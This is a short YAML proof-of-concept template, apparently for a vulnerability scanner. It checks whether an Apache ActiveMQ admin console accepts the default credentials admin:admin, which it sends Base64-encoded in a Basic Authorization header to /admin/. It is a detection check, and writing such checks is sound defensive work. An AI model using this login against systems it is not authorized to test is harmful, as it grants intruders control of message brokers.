id: poc-yaml-activemq-default-password
info:
  name: Activemq 默认密码漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: Activemq
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /admin/
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 401 && contains(body, "Unauthorized")
  output: []
- method: GET
  path: /admin/
  headers:
    Authorization: Basic YWRtaW46YWRtaW4=
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "Welcome to the Apache ActiveMQ
    Console of") && contains(body, "<h2>Broker</h2>")
  output: []
